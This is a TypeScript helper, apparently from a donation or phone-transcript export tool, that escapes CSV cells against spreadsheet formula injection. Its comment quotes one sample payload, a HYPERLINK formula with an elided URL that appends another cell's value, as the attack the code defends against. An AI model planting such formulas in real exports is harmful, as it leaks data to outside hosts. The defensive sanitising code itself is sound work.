/**
 * One CSV cell, safe to open in a spreadsheet.
 *
 * Exports carry text strangers wrote: a donor's name from the public give
 * form, a caller's words from a phone transcript. A cell that starts with
 * `=`, `+`, `-`, `@`, a tab or a carriage return is a formula to Excel and
 * Google Sheets, so `=HYPERLINK("https://…?"&B2,"Open")` in a donor name ran
 * the moment the treasurer opened the file. Such a cell gets a leading `'`,
 * which the spreadsheet shows as plain text. A plain number (a negative
 * amount) is left alone so it stays a number.
 */
export function csvCell(value: string | number | null | undefined): string {
  let text = value == null ? "" : String(value);
  if (/^[=+\-@\t\r]/.test(text) && !/^[-+]?\d+(\.\d+)?$/.test(text)) {
    text = `'${text}`;
  }
  if (/[",\n\r]/.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }
  return text;
}
